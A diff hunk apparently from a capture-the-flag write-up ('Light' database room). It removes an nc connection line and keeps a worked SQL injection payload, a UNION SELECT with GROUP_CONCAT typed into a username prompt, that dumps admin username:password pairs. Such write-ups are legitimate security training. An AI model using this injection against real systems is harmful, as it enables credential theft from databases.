@@ -215,11 +215,7 @@ Both tables have the same structure: `id`, `username`, `password`.
 
 Now let's extract the admin credentials in one go using `GROUP_CONCAT` with a separator. We combine the username and password with a colon, and use `CHAR(10)` (newline) as the separator between rows:
 
-```bash
-nc 10.129.186.215 1337
-```
 ```text
-Welcome to the Light database!
 Please enter your username:  smokey' Union SeLECT GROUP_CONCAT(username || ':' || password , CHAR(10)) FROM admintable '   
 Password: [REDACTED]
 flag: THM{...}
